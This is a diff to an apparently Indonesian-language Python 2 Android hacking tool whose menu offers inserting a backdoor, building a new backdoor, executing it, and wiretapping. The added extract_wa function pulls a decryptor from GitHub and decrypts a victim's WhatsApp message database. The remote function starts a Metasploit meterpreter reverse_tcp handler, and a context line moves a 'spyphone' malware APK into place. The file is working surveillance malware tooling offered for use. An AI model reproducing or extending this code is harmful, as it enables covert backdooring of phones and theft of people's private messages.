@@ -3,10 +3,8 @@
 
 import os
 import time
-import itertools
-import threading
 import sys
-
+import random
 
 
 putih="\x1b[1;97m"
@@ -20,8 +18,18 @@ bold= '\033[1m'
 end= '\033[0m'
 
 
+def flush(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(random.random() * 0.1)
+
 def out():
 	exit()
+	
+def back():
+	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+	home()
 
 os.system("clear")
 confirm =raw_input(putih+'Sudah mempunyai akun Portmap.io? y/n : ')
@@ -147,7 +155,29 @@ def spyphone():
 	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
 	os.system('mv -f Malware/spyphone.apk /storage/emulated/0/')
 		
-	
+def extract_wa():
+	os.system('clear')
+	logo()
+	time.sleep(1)
+	flush(hijau+'Ambilkan saya Key&Database')
+	print '--------------------------------'
+	flush('saya akan berikan yang kamu inginkan')
+	print '--------------------------------'
+	time.sleep(1)
+	zedd=raw_input('Siap menyelam Kesystem? y/n : ')
+	if zedd == 'y':
+		remote()
+	else :
+		if zedd == 'n':
+			home()
+	os.system('git clone https://github.com/PyRAT-svg/decryptor12 &&mv decryptor12 d')
+	os.system('cd d && php decrypt.php msgstore.db.crypt12 key')
+	os.system('cd d && mv msgstore.db /storage/emulated/0/BackupTextForWhatsApp/msgstore.db')
+	os.system('cd d && mv msgstore.enc /storage/emulated/0/BackupTextForWhatsApp/msgstore.enc')
+	os.system('rm -rf d')
+	os.system('am start --user 0 -n com.smeiti.wstotexu/com.smeiti.wstotexu.WStoTextActivity')
+	back()
+
 def awal():
 	malware()
 	pilmal()
@@ -237,9 +267,8 @@ def remote():
       remote()
     else :
       os.system("clear")
-      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit -t dump_sms; sessions -k 1-5'");
+      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
       raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-      home() 
 
 
     
@@ -291,19 +320,20 @@ def menu():
     print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
     print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
     print '\x1b[1;91m3.\x1b[1;97mEsekusi'
-    print '\x1b[1;91m4.\x1b[1;97mUpdate--'
-    print '\x1b[1;91m5.\x1b[1;97mExit'
+    print '\x1b[1;91m4.\x1b[1;97mSadap'+cyan+' *New'
+    print '\x1b[1;91m5.\x1b[1;97mUpdate--'
+    print '\x1b[1;91m6.\x1b[1;97mExit'
     print '\r\x1b[1;91m__________________________________________«» '
  
 
 def pilih():
     zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
     if zedd == '':
+    	
         print '\x1b[1;91m[!] Can\'t empty'
         time.sleep(1)
         os.system('clear')
         home()
-        
     else:
         if zedd == '1':
             sisip()
@@ -313,19 +343,22 @@ def pilih():
             else:
               if zedd == '3':
                 remote()
+                home()
               else:
 				  if zedd == '4':
-					  update()
+					extract_wa()
 				  else:	
 					 if zedd == '5':
-						  exit()
-					 else:					
-					  print '\x1b[1;91m[!] Pilih 1,2,3'
-					  os.system('clear')
-					  home()
-					  
-                
-        
+					   update()
+					 else:
+					   print 'ok'
+					   if zedd == '6':
+					     exit()
+					   else:
+					     print '\x1b[1;91m[!] Pilih 1-6'
+					     os.system('clear')
+					     home()
+
 def home():
 	menu()
 	pilih()         
